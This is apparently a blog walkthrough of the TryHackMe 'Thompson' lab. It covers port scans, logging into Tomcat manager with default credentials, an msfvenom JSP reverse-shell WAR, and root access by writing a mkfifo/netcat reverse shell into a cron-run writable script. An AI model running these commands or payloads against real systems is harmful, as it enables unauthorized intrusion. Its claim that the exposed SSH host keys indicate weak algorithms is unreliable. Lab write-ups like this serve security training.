---
title: 'TryHackMe: Thompson CTF Walkthrough' 
author: 0xcrax
categories: [TryHackMe]
tags: [ffuf, Subdomain-Enumeration, Subdirectory-Enumeration, rustscan, tomcat, crontab, rlwrap, msfvenom]
render_with_liquid: true
img_path: /images/TryHackMe/Thompson
image:
  path: /images/TryHackMe/Thompson/room_image.webp
---

🧰 Writeup Overview

Compromised outdated Apache Tomcat using default credentials and a malicious WAR payload for initial access, then escalated to root via a writable cron-executed script.

<a href="https://tryhackme.com/r/room/bsidesgtthompson" target="_blank" class="box-button" data-mobile-text="Thompson CTF Challenge | TryHackMe" style="display: flex; width: 100%; max-width: 1000px; align-items: center; justify-content: center; background: linear-gradient(135deg, #2a0e0e 0%, #1a0505 100%); padding: 15px 20px; border-radius: 8px; box-shadow: 0 4px 15px rgba(255, 0, 0, 0.3); color: #ff4444; text-decoration: none; font-family: Arial, sans-serif; font-weight: bold; border: 1px solid #ff5555; margin: 10px auto; transition: all 0.3s ease;" onmouseover="this.style.transform='translateY(-2px)'; this.style.boxShadow='0 0 25px rgba(255, 0, 0, 0.7)'; this.style.color='#ffffff';" onmouseout="this.style.transform='translateY(0px)'; this.style.boxShadow='0 4px 15px rgba(255, 0, 0, 0.3)'; this.style.color='#ff4444';">
<span>Thompson CTF Challenge | TryHackMe</span>
<img src="/images/TryHackMe/THM.webp" alt="Icon" style="width: 48px; height: 48px; margin-right: 10px; filter: hue-rotate(300deg) brightness(0.9); transition: all 0.3s ease;" onmouseover="this.style.transform='scale(1.1)'; this.style.filter='hue-rotate(320deg) brightness(1.3)';" onmouseout="this.style.transform='scale(1)'; this.style.filter='hue-rotate(300deg) brightness(0.9)';">
</a>

## Reconnaissance

### Open Ports & Services
```sh
rustscan -a thompson.thm — range 1–65535
```

![](/images/TryHackMe/Thompson/open-ports.png)

---

```sh
rustscan -a thompson.thm -p 22,8080,8009 -- -Pn -A -sCV -T4 -oN thompson.nmap
```

Output:
```sh
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.224.113:22
Open 10.10.224.113:8080
Open 10.10.224.113:8009
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-10 14:59 GMT
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:59
Completed NSE at 14:59, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:59
Completed NSE at 14:59, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:59
Completed NSE at 14:59, 0.00s elapsed
Initiating SYN Stealth Scan at 14:59
Scanning thompson.thm (10.10.224.113) [3 ports]
Discovered open port 22/tcp on 10.10.224.113
Discovered open port 8080/tcp on 10.10.224.113
Discovered open port 8009/tcp on 10.10.224.113
Completed SYN Stealth Scan at 14:59, 0.23s elapsed (3 total ports)
Initiating Service scan at 14:59
Scanning 3 services on thompson.thm (10.10.224.113)
Completed Service scan at 14:59, 7.28s elapsed (3 services on 1 host)
Initiating OS detection (try #1) against thompson.thm (10.10.224.113)
Initiating Traceroute at 14:59
Completed Traceroute at 14:59, 0.14s elapsed
Initiating Parallel DNS resolution of 1 host. at 14:59
Completed Parallel DNS resolution of 1 host. at 14:59, 0.08s elapsed
DNS resolution of 1 IPs took 0.08s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
NSE: Script scanning 10.10.224.113.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:59
Completed NSE at 14:59, 3.93s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:59
Completed NSE at 14:59, 0.56s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:59
Completed NSE at 14:59, 0.00s elapsed
Nmap scan report for thompson.thm (10.10.224.113)
Host is up, received user-set (0.14s latency).
Scanned at 2025-08-10 14:59:09 GMT for 15s

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fc:05:24:81:98:7e:b8:db:05:92:a6:e7:8e:b0:21:11 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDL+0hfJnh2z0jia21xVo/zOSRmzqE/qWyQv1G+8EJNXze3WPjXsC54jYeO0lp2SGq+sauzNvmWrHcrLKHtugMUQmkS9gD/p4zx4LjuG0WKYYeyLybs4WrTTmCU8PYGgmud9SwrDlEjX9AOEZgP/gj1FY+x+TfOtIT2OEE0Exvb86LhPj/AqdahABfCfxzHQ9ZyS6v4SMt/AvpJs6Dgady20CLxhYGY9yR+V4JnNl4jxwg2j64EGLx4vtCWNjwP+7ROkTmP6dzR7DxsH1h8Ko5C45HbTIjFzUmrJ1HMPZMo9ss0MsmeXPnZTmp5TxsxbLNJGSbDv7BS9gdCyTf0+Qq1
|   256 60:c8:40:ab:b0:09:84:3d:46:64:61:13:fa:bc:1f:be (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBG6CiO2B7Uei2whKgUHjLmGY7dq1uZFhZ3wY5EWj5L7ylSj+bx5pwaiEgU/Velkp4ZWXM//thL6K1lAAPGLxHMM=
|   256 b5:52:7e:9c:01:9b:98:0c:73:59:20:35:ee:23:f1:a5 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIwYtK4oCnQLSoBYAztlgcEsq8FLNL48LyxC2RfxC+33
8009/tcp open  ajp13   syn-ack ttl 63 Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8080/tcp open  http    syn-ack ttl 63 Apache Tomcat 8.5.5
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-title: Apache Tomcat/8.5.5
|_http-favicon: Apache Tomcat
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.4
OS details: Linux 4.4
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=8/10%OT=22%CT=%CU=40535%PV=Y%DS=2%DC=T%G=N%TM=6898B3CC
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10C%TI=Z%CI=I%II=I%TS=8)OPS(
OS:O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST11
OS:NW7%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(
OS:R=Y%DF=Y%T=40%W=6903%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Uptime guess: 196.483 days (since Sun Jan 26 03:24:18 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   126.09 ms 10.9.0.1
2   128.23 ms thompson.thm (10.10.224.113)

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:59
Completed NSE at 14:59, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:59
Completed NSE at 14:59, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:59
Completed NSE at 14:59, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.22 seconds
           Raw packets sent: 35 (2.350KB) | Rcvd: 22 (1.638KB)
```

Here's a concise summary of the RustScan and Nmap results for the target `thompson.thm`:

`22/tcp - SSH`
- OpenSSH 7.2p2 (Ubuntu 4ubuntu2.8)
- Weak key algorithms (RSA, ECDSA, ED25519 keys exposed).
- OS: Linux (Ubuntu).

`8009/tcp - AJP13`
- Apache JServ Protocol v1.3 (often used with Tomcat).
- Failed to retrieve valid AJP methods (potential misconfiguration).

`8080/tcp - HTTP`
- Apache Tomcat 8.5.5 (outdated, vulnerable version).
- Supported methods: `GET`, `HEAD`, `POST`.
- Default Tomcat landing page detected.

**Additional Findings:**
OS Detection: Likely Linux 4.4 kernel (Ubuntu-based).
Uptime: ~196 days (since Jan 26, 2025).
Network Distance: 2 hops away.

**Vulnerability Hints:**
Outdated OpenSSH (7.2p2 has known exploits like `user enumeration`).
Tomcat 8.5.5 is vulnerable to multiple CVEs (e.g., CVE-2017-12615 for RCE).
AJP (8009) might be exploitable (e.g., Ghostcat vulnerability).

---

### Web Browser Survey

`http://thompson.thm:8080/`
`http://thompson.thm:8009/` 

![](/images/TryHackMe/Thompson/8080.png)

---

![](/images/TryHackMe/Thompson/8009.png)
we can't access on port 8009

But there is nothing important here.

---

## Foothold
**Recommendations:**
- Exploit Tomcat: Check default credentials (`admin:admin`, `tomcat:s3cret`) or deploy a malicious WAR for RCE.
- Inspect AJP: Use tools like `metasploit` to exploit AJP misconfigurations.
- SSH Audit: Test for weak credentials or CVE-2017-15906 (user enumeration).

Now we will discover a Subdirectory & Subfiles

OR Access to Those Dierct:

![](/images/TryHackMe/Thompson/Directories.png)

---

```sh
ffuf -u https://thompson.thm:8080/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt -fc 403,402,404 -c
```

![](/images/TryHackMe/Thompson/Directories1.png)

---

```sh
ffuf -u https://thompson.thm:8080/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files.txt -fc 403,402,404 -c
```

![](/images/TryHackMe/Thompson/Files.png)

---

Now login to `http://thompson.thm:8080/manager` throw Credential `tomcat:s3cret` 

![](/images/TryHackMe/Thompson//Manager.png)

---

Then Create shellcode as `war file` by `msfvenom`

```sh
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.9.1.252 LPORT=4444 -f war -o shell.war
```

Setup Listener
```sh
nc -lvnp 4444
```

Upload & Deploy a malicious WAR

![](/images/TryHackMe/Thompson/below1.png)

Refresh page then Click on `/shell` such below:

<div class="gif-container">
<img src="/gifs/click.gif" alt="GIF" class="gif-responsive">
</div>

![](/images/TryHackMe/Thompson/below2.png)

---

Finally 
```sh
┌──(cracker㉿carcker)-[~/Desktop/THM/thompson]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.9.1.252] from (UNKNOWN) [10.10.224.113] 36786
id
uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
python -c "import pty;pty.spawn('/bin/bash')"
tomcat@ubuntu:/$ export TERM=xterm-256color

export TERM=xterm-256color
tomcat@ubuntu:/$ 
tomcat@ubuntu:/$ ^Z
zsh: suspended  nc -lvnp 4444
```
```sh                                                                                                                                   
┌──(cracker㉿carcker)-[~/Desktop/THM/thompson]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 4444

tomcat@ubuntu:/$ ls -la
total 92
drwxr-xr-x 22 root root  4096 Aug 14  2019 .
drwxr-xr-x 22 root root  4096 Aug 14  2019 ..
drwxr-xr-x  2 root root  4096 Aug 14  2019 bin
drwxr-xr-x  3 root root  4096 Aug 14  2019 boot
drwxr-xr-x 17 root root  3700 Aug 10 07:55 dev
drwxr-xr-x 92 root root  4096 Aug 23  2019 etc
drwxr-xr-x  3 root root  4096 Aug 14  2019 home
lrwxrwxrwx  1 root root    33 Aug 14  2019 initrd.img -> boot/initrd.img-4.4.0-159-generic
lrwxrwxrwx  1 root root    33 Aug 14  2019 initrd.img.old -> boot/initrd.img-4.4.0-142-generic
drwxr-xr-x 19 root root  4096 Aug 14  2019 lib
drwxr-xr-x  2 root root  4096 Aug 14  2019 lib64
drwx------  2 root root 16384 Aug 14  2019 lost+found
drwxr-xr-x  4 root root  4096 Aug 14  2019 media
drwxr-xr-x  2 root root  4096 Feb 26  2019 mnt
drwxr-xr-x  3 root root  4096 Aug 14  2019 opt
dr-xr-xr-x 86 root root     0 Aug 10 07:55 proc
drwx------  3 root root  4096 Aug 14  2019 root
drwxr-xr-x 17 root root   520 Aug 10 07:55 run
drwxr-xr-x  2 root root 12288 Aug 14  2019 sbin
drwxr-xr-x  2 root root  4096 Feb 26  2019 srv
dr-xr-xr-x 13 root root     0 Aug 10 07:55 sys
drwxrwxrwt 10 root root  4096 Aug 10 10:44 tmp
drwxr-xr-x 10 root root  4096 Aug 14  2019 usr
drwxr-xr-x 11 root root  4096 Aug 14  2019 var
lrwxrwxrwx  1 root root    30 Aug 14  2019 vmlinuz -> boot/vmlinuz-4.4.0-159-generic
lrwxrwxrwx  1 root root    30 Aug 14  2019 vmlinuz.old -> boot/vmlinuz-4.4.0-142-generic
```

Now you can get user.txt
```sh
cd /home/jack/
cat user.txt
```

---

## Privilege Escalation

```sh
find / -type f -writable 2>/dev/null | grep -Ev '^(/proc|/snap|/sys|/dev)'
```

We Found `id.sh` is `Writable file` as root after check in /etc/crontab & `Executable file` as jack.  

```sh
ls -la /home/jack
```
`-rwxrwxrwx 1 jack jack   26 Aug 14  2019 id.sh`


```sh
cat /etc/crontab
```

![](/images/TryHackMe/Thompson/crontab.png)

---

Finally let get reverse shell as `root`

```sh
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.1.252 9001 >/tmp/f" > /home/jack/id.sh
```

![](/images/TryHackMe/Thompson/reverse-shell.png)

---

```sh
rlwrap nc -lvnp 9001
```

Now we are root

![](/images/TryHackMe/Thompson/root.png)

<div class="gif-container">
<img src="/gifs/tierd.gif" alt="GIF" class="gif-responsive">
</div>

---

<style>
img {
  transition: all 0.3s ease;
}

img:hover {
  transform: scale(1.05);
  filter: brightness(90%);
  box-shadow: 0 15px 35px rgba(0, 0, 0, 0);
}

img:center {
  display: block;
  margin-left: auto;
  margin-right: auto;
}

.wrap pre {
  white-space: pre-wrap;
}

.gif-container {
    text-align: center;
    margin: 30px 0;
}

.gif-responsive {
    width: 100%;
    max-width: 800px;
    height: 450px;
    border-radius: 12px;
    object-fit: cover;
    box-shadow: 0 10px 25px rgba(0, 0, 0, 0);
    transition: transform 0.3s ease, box-shadow 0.3s ease;
}

.gif-responsive:hover {
    transform: scale(1.02);
    box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
}

/* Additional video styles */
.video-container {
  text-align: center;
  margin: 30px auto;        /* centers inside post */
  max-width: 800px;         /* keeps container from being huge */
}

.video-responsive {
  width: 100%;              /* fill container */
  aspect-ratio: 16 / 9;    /* keeps correct proportions on desktop */
  border-radius: 12px;
  object-fit: cover;
  box-shadow: 0 10px 25px rgba(0.1, 0.1, 0, 0.1);
  transition: transform 0.3s ease, box-shadow 0.3s ease;
}

.video-responsive:hover {
  transform: scale(1.02);
  box-shadow: 0 15px 35px rgba(0, 0, 0, 0.4);
}

/* Mobile Responsive Styles */
@media screen and (max-width: 768px) {
    .gif-responsive {
    width: 100% !important;
    max-width: 100% !important;
    height: auto !important;
  }

  .video-responsive {
    width: 100% !important;
    max-width: 100% !important;
    aspect-ratio: auto;  /* let phone use natural aspect ratio */
    height: auto !important;
  }
  
  .box-button {
    max-width: 100% !important;
    width: 100% !important;
    padding: 10px 14px !important;
    justify-content: center !important;
    gap: 6px !important;
    position: relative;
  }
  /* Hide desktop text on mobile */
  .box-button span {
    display: none !important;
  }

  /* Show mobile text from data attribute */
  .box-button::after {
    content: attr(data-mobile-text) !important;
    font-size: 10px !important;
    text-align: center !important;
    white-space: nowrap !important;
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif !important;
    font-weight: 1000 !important;
  }

      /* DEFAULT: Use #a1a1a1 for most buttons */
    .box-button::after {
      color: #a1a1a1 !important;
    }

    /* Specific color overrides for each button style */
    
    /* CYBER BLUE NEON - Blue text */
    .box-button[style*="color: #00ccff"]::after,
    .box-button[style*="color:#00ccff"]::after {
      color: #00ccff !important;
    }

    /* HACKER GREEN TERMINAL - Green text */
    .box-button[style*="color: #00ff88"]::after,
    .box-button[style*="color:#00ff88"]::after {
      color: #00ff88 !important;
    }

    /* PURPLE NEON LIGHT - Purple text */
    .box-button[style*="color: #cc00ff"]::after,
    .box-button[style*="color:#cc00ff"]::after {
      color: #cc00ff !important;
    }

    /* RED ALERT GLOW - Red text (#ff4444) */
    .box-button[style*="color: #ff4444"]::after,
    .box-button[style*="color:#ff4444"]::after,
    .box-button[style*="color: #ff5555"]::after,
    .box-button[style*="color:#ff5555"]::after {
      color: #ff4444 !important;
    }

    /* ORANGE SUNLIGHT - Orange text */
    .box-button[style*="color: #ffaa00"]::after,
    .box-button[style*="color:#ffaa00"]::after {
      color: #ffaa00 !important;
    }

    /* MINIMAL LIGHT SHINE - Dark text for light background */
    .box-button[style*="background: #ffffff"]::after,
    .box-button[style*="background:#ffffff"]::after,
    .box-button[style*="color: #333333"]::after,
    .box-button[style*="color:#333333"]::after {
      color: #333333 !important;
    }

    /* TEAL CYBER GLOW - Teal text */
    .box-button[style*="color: #5eead4"]::after,
    .box-button[style*="color:#5eead4"]::after {
      color: #5eead4 !important;
    }

    /* PINK NEON LIGHT - Pink text */
    .box-button[style*="color: #f9a8d4"]::after,
    .box-button[style*="color:#f9a8d4"]::after {
      color: #f9a8d4 !important;
    }

    /* FOREST GREEN LIGHT - Lime text */
    .box-button[style*="color: #bef264"]::after,
    .box-button[style*="color:#bef264"]::after {
      color: #bef264 !important;
    }

    /* DARK RED WINE GLOW - Light red text */
    .box-button[style*="color: #fecaca"]::after,
    .box-button[style*="color:#fecaca"]::after {
      color: #fecaca !important;
    }

    /* LIGHT BLUE SKY SHINE - Blue text */
    .box-button[style*="color: #1e40af"]::after,
    .box-button[style*="color:#1e40af"]::after {
      color: #1e40af !important;
    }

    /* DARK ORANGE GLOW - Orange text */
    .box-button[style*="color: #fdba74"]::after,
    .box-button[style*="color:#fdba74"]::after {
      color: #fdba74 !important;
    }

    /* CYBER YELLOW - Yellow text */
    .box-button[style*="color: #fef08a"]::after,
    .box-button[style*="color:#fef08a"]::after {
      color: #fef08a !important;
    }

    /* DEEP SPACE - Purple text */
    .box-button[style*="color: #9370db"]::after,
    .box-button[style*="color:#9370db"]::after {
      color: #9370db !important;
    }

    /* ELECTRIC PINK - Pink text */
    .box-button[style*="color: #e879f9"]::after,
    .box-button[style*="color:#e879f9"]::after {
      color: #e879f9 !important;
    }

    /* LAVA RED - Light red text */
    .box-button[style*="color: #fca5a5"]::after,
    .box-button[style*="color:#fca5a5"]::after {
      color: #fca5a5 !important;
    }

    /* AQUA MARINE - Teal text */
    .box-button[style*="color: #99f6e4"]::after,
    .box-button[style*="color:#99f6e4"]::after {
      color: #99f6e4 !important;
    }

    /* ROYAL PURPLE - Light purple text */
    .box-button[style*="color: #d8b4fe"]::after,
    .box-button[style*="color:#d8b4fe"]::after {
      color: #d8b4fe !important;
    }

    /* EMERALD GREEN - Green text */
    .box-button[style*="color: #6ee7b7"]::after,
    .box-button[style*="color:#6ee7b7"]::after {
      color: #6ee7b7 !important;
    }

    /* MIDNIGHT BLUE - Light blue text */
    .box-button[style*="color: #93c5fd"]::after,
    .box-button[style*="color:#93c5fd"]::after {
      color: #93c5fd !important;
    }

    /* Light backgrounds with colored text - use original colors */
    .box-button[style*="background: linear-gradient(135deg, #fef3c7"]::after,
    .box-button[style*="background: linear-gradient(135deg, #fde68a"]::after,
    .box-button[style*="background: linear-gradient(135deg, #f8fafc"]::after,
    .box-button[style*="background: linear-gradient(135deg, #dbeafe"]::after,
    .box-button[style*="background: linear-gradient(135deg, #bfdbfe"]::after {
      color: #333333 !important; /* Dark text for better contrast on light backgrounds */
    }

  .box-button img {
    width: 28px !important;
    height: 28px !important;
    margin-right: 0 !important;
  }
}
/* Desktop Styles */
@media screen and (min-width: 769px) {
  .box-button::after {
    display: none !important;
  }
  
  .box-button span {
    display: inline !important;
  }
}
</style>
<script>
// Function to make only .redirect class links open in new tabs, but not work here actually i don'know why
document.querySelectorAll('a.redirect').forEach(link => {
    link.setAttribute('target', '_blank');
    link.setAttribute('rel', 'noopener noreferrer');
});
</script>
